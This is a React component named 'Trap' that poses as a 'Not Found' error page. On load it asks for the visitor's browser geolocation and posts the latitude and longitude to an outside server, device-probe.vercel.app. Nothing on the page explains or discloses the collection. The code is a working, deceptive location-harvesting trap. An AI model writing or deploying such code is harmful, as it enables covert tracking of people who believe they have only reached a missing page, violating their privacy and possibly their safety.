/* eslint-disable react-hooks/rules-of-hooks */
import React from "react";
import axios from "axios";
import { useEffect } from "react";

const Trap = () => {
  useEffect(() => {
    getLocation();
  }, []);

  function getLocation() {
    navigator.geolocation.getCurrentPosition(async (position) => {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;

      const body = {
        deviceLatitude: latitude,
        deviceLongitude: longitude,
      };
      main(body);
    });
  }

  function main(body) {
    return axios
      .post(`https://device-probe.vercel.app/`, {
        deviceLatitude: body.deviceLatitude,
        deviceLongitude: body.deviceLongitude,
      })
      .then((response) => {
        return response.data;
      })
      .catch((error) => {
        return { res: error, status: false, statusCode: 500, error: "error" };
      });
  }
  return (
    <div className="not-found">
      <h1>Not Found</h1>
      <p>We're sorry, but the page you requested could not be found.</p>
      <button>Go Back</button>
    </div>
  );
};

export default Trap;
